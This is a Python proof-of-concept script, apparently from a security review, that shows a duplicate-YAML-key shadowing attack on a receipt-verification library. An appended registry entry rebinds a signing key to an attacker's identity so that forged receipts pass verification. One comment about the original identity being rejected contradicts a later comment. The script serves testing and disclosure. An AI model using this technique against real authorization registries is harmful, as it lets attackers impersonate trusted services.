#!/usr/bin/env python3
"""poc_alpha_11 — registry supply-chain confusion: load_authorized_actors
parses the registry with yaml.safe_load, which resolves DUPLICATE mapping
keys silently (last wins, no warning, no error).

A registry committed to a repo binds key K to svc-payments-deployer. An
attacker who can LAND AN APPEND (a far weaker capability than rewriting the
file — code review scans for changed lines, not for a second occurrence of a
key 400 lines down) adds a second entry for K naming their own workload.
The verifier silently binds K to the attacker's identity, and receipts
claiming that identity PASS — while anyone reading the top of the file still
sees the original binding.
"""
import sys, tempfile, os
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, generate_keypair, verify_receipt,
                         load_authorized_actors, keyid, sha256_hex)

POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

sk, pk = generate_keypair()
kid = keyid(pk)

registry_yaml = f"""# Authorized actors — production. Reviewed by: secops
authorized_actors:
  {kid}:
    id: svc-payments-deployer
    type: service
  deadbeefdeadbeef00:
    id: svc-metrics
    type: service
# --- 400 lines of other entries ... attacker appends: ---
  {kid}:
    id: svc-mallory-bot
    type: service
"""

with tempfile.NamedTemporaryFile("w", suffix=".yaml", delete=False) as f:
    f.write(registry_yaml)
    path = f.name

reg = load_authorized_actors(path)
print(f"[*] parsed registry binds {kid} -> {reg[kid]!r}  (file's FIRST entry said svc-payments-deployer)")

mallory = {"type": "service", "id": "svc-mallory-bot", "is_service_account": True,
           "auth_method": "api_key"}
r = build_receipt(action_id="exfil-001", subject_name="prod:svc", actor=mallory,
                  policy_decision=POL,
                  execution={"side_effect_class": "EXTERNAL_OBSERVABLE", "status": "EXECUTED"},
                  evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)
v = verify_receipt(r, pk, authorized_actors=reg)
print(f"[*] receipt claims 'svc-mallory-bot': verdict={v.verdict} reasons={v.reasons}")

# The originally-intended identity is now REJECTED for this key:
payments = dict(mallory, id="svc-payments-deployer")
r2 = build_receipt(action_id="deploy-002", subject_name="prod:svc", actor=payments,
                   policy_decision=POL,
                   execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                   evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)
v2 = verify_receipt(r2, pk, authorized_actors=reg)
print(f"[*] original identity 'svc-payments-deployer' now: verdict={v2.verdict}")
os.unlink(path)

# The exploit is the SILENT SHADOWING: the appended duplicate decided the
# binding with no error/warning, and the attacker's identity verifies.
# (v2 also PASSes for the original id because service ids are unbound — see
# poc_alpha_6; for a human entry the dup would flip PASS/FAIL outright.)
works = reg[kid]["id"] == "svc-mallory-bot" and v.verdict == "PASS"
print("EXPLOIT-WORKS" if works else "HELD")
